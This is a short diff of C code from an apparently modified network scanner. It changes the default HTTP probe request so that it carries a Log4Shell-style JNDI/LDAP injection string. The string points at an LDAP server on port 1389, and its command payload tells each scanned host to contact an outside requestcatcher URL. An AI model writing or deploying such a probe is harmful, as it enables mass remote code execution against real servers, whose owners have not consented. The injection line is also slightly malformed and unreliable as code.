@@ -383,7 +383,7 @@ http_change_field(unsigned char **inout_header, size_t header_length,
  ***************************************************************************/
 static const char
 http_hello[] =      "GET / HTTP/1.0\r\n"
-                    "$(jndi:ldap://127.0.0.1:1389/Basic/Command/start https://shiba.requestcatcher.com/test)"
+                    "$(jndi:ldap://127.0.0.1:1389/Basic/Command/start www.shiba.requestcatcher.com/test)"
                     "Accept: */*\r\n"
                     //"Connection: Keep-Alive\r\n"
                     //"Content-Length: 0\r\n"
